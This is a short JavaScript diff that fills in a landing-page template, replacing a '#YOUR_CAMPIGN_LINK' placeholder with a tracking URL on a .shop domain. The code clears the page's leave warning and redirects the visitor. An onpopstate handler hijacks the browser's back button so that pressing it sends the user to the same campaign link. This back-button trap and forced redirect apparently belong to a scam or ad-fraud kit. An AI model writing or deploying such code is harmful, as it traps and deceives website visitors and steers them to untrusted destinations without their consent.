@@ -12,7 +12,7 @@ function startTimer(t, n) {
 
 function go() {
     window.onbeforeunload = null;
-    window.location = "#YOUR_CAMPIGN_LINK";
+    window.location = "https://track.toackeerby.shop/cwdhl0k.php?lp=1";
 }
 
 window.onload = function() {
@@ -32,7 +32,7 @@ window.onload = function() {
         }
         onpopstate = function(t) {
             if (t.state) {
-                location.replace("#YOUR_CAMPIGN_LINK");
+                location.replace("https://track.toackeerby.shop/cwdhl0k.php?lp=1");
             }
         };
     } catch (t) {
